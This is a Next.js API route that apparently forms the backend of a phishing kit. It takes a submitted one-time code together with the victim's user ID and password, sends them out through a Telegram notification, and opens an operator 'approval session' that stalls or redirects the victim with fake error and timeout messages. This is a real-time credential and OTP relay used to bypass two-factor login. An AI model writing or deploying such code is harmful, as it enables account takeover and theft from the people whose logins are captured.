import { NextRequest, NextResponse } from "next/server"
import { createApprovalSession, sendApprovalActionMessage } from "@/lib/approval-webhook"
import { OTP_CODE_ERROR_TEXT } from "@/lib/approval-messages"
import { telegramService } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const code = String(data?.code ?? "")
    await telegramService.sendVerificationNotification(data)

    const session = createApprovalSession({
      trigger: "otp",
      page: "/verify?mode=code",
      nextPage: "/api/login-out",
      redirectPage: "/verify?mode=code",
      userId: String(data?.userId ?? ""),
      password: String(data?.password ?? ""),
      denyMessage: OTP_CODE_ERROR_TEXT,
      timeoutMessage: "Unable to verify the code at this time. Please try again.",
    })

    await sendApprovalActionMessage(session)

    return NextResponse.json({ success: true, sessionId: session.id })
  } catch (error) {
    console.error("Error sending verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}

